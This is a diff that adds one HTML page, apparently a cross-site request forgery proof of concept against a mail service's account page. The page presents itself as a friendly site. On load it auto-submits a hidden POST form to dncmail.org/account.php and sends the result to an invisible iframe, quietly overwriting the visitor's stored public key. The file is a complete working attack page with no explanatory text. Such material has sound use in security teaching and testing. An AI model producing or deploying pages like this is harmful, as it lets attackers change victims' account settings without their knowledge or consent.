@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>This is a great website!</title>
+	<h1>HEllooooo!</h1>
+	<script type="text/javascript">
+		function attack(){
+			document.forms[0].submit();
+		}
+	</script>
+</head>
+<body onload="attack()">
+<iframe name="hiddenframe" src="http://dncmail.org/account.php" style="width:0; height:0; border:0; border:none">
+	
+</iframe>
+
+<form action="http://dncmail.org/account.php" target="hiddenframe" method="post">
+<input	type="hidden"
+		name="action"
+		value="save"/>
+<input  type="hidden"
+		name="pubkey"
+		value="Bounus!"/>
+</form>
+
+
+</body>
+</html>
